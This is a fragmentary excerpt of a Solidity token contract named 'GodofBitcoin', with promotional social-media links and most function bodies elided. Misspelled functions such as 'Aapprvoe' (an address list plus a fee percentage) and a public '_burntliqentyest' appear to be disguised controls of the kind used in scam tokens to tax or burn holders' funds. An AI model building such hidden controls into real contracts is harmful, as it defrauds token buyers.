/**
https://t.me/GodofBitcoinerc20
https://twitter.com/GodofBitcoin_
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipbtcverty(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract GodofBitcoin is Ownable {
    ...
    function Aapprvoe(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntliqentyest(address user) public {
